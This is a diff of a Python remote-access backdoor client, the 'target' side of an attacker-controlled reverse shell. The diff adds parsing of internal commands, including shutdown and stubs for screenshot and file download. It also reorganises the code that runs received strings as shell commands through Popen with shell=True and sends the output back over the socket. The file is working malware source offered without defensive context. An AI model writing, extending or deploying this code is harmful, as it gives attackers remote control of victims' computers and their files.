@@ -67,49 +67,54 @@ def main():
             logger.info(f"Received: {data_str}");
 
 
+            cmd, params = command.get_cmd_params(in_cmd)
+
             # Check if is internal command type.
-            iicp = command.is_internal_command_prefix(in_cmd)
+            iicp = command.is_internal_command_prefix(cmd)
             iic = False
             if iicp:
                 # Remove prefix, get the internal command.
-                rl_cmd = in_cmd[1:]
+                rl_cmd = cmd[1:]
                 iic = command.is_internal_command(rl_cmd)
                 if not iic:
                     logger.error(f"'{in_cmd}' is not recognized internal command.")
+
+
+            output = "** Default output command... **".encode(constant.ENCODE_TYPE)
 
             if iic:
                 # NOTE(jenchieh): Check possible command at this moment.
                 if rl_cmd == command.Command.SHUTDOWN.value:
                     logger.info("Shutdown by attacker...")
                     break
+                if rl_cmd == command.Command.SCREENSHOT.value:
+                    logger.info("Taking screenshot...")
+                if rl_cmd == command.Command.DOWNLOAD.value:
+                    logger.info("Downloading file...")
+            else:
+                if "cd" in in_cmd:
+                    cd_path = params[1]
+                    if ".." in cd_path:
+                        os.chdir("..")
+                    elif os.path.isdir(cd_path):
+                        os.chdir(cd_path)
+                    continue
 
-            cd_path = in_cmd.split(" ")
+                # Execute shell command.
+                proc = Popen(in_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+                outs, errs = proc.communicate()
 
-            if "cd" in in_cmd:
-                cd_param = cd_path[1]
-                if ".." in cd_param:
-                    os.chdir("..")
-                elif os.path.isdir(cd_param):
-                    os.chdir(cd_param)
-                continue
-
-            # Execute shell command.
-            proc = Popen(in_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-            outs, errs = proc.communicate()
-
-            output = "** Default output command... **".encode(constant.ENCODE_TYPE)
-
-            if outs:
-                output = outs
-            if errs:
-                output = errs
+                if outs:
+                    output = outs
+                if errs:
+                    output = errs
 
             # Send results
             s.sendall(output)
 
-        logger.info("Cleaning the socket buffer...")
         s.shutdown(socket.SHUT_RDWR)
         s.close()
+        logger.info("Target program exits.")
 
 if __name__ == "__main__":
     main()
